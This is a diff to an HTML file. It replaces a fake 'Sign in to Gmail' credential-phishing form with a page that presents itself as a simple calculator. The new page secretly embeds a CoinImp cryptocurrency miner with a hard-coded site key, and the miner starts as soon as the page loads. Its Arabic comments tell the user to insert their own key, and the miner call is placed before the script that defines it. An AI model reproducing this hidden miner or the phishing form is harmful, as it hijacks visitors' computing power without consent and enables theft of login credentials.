@@ -3,18 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fake Gmail Login</title>
+    <title>Calculator with CoinImp Mining</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+        #calculator {
+            display: inline-block;
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        input {
+            width: 40px;
+            margin: 5px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Sign in to Gmail</h1>
-    <form action="http://localhost:8000/" method="POST">
-        <label for="email">Email:</label>
-        <input type="text" id="email" name="email" required><br><br>
+    <div id="calculator">
+        <h1>Simple Calculator</h1>
+        <input type="text" id="num1" placeholder="Num 1">
+        <input type="text" id="num2" placeholder="Num 2">
+        <button onclick="addNumbers()">Add</button>
+        <h3>Result: <span id="result"></span></h3>
+    </div>
 
-        <label for="password">Password:</label>
-        <input type="password" id="password" name="password" required><br><br>
+    <script>
+        // دالة لإجراء عملية الجمع
+        function addNumbers() {
+            var num1 = parseFloat(document.getElementById('num1').value);
+            var num2 = parseFloat(document.getElementById('num2').value);
+            var result = num1 + num2;
+            document.getElementById('result').textContent = result;
+        }
 
-        <input type="submit" value="Sign In">
-    </form>
+        // دمج كود تعدين CoinImp
+        var miner = new CoinImp.Anonymous('77df418b1f6d4f42050541215eed6c63cfaca765118650d51be37632dfc12cb0');  // ضع مفتاح الموقع الخاص بك هنا
+        miner.start();
+
+        // الاستماع لحالة التعدين
+        miner.on('found', () => console.log('Hash found!'));
+        miner.on('accepted', () => console.log('Hash accepted!'));
+        miner.on('error', (err) => console.error('Error: ', err));
+    </script>
+
+    <!-- سكربت CoinImp -->
+    <script src="https://www.coinimp.com/scripts/miner.js"></script>
 </body>
 </html>
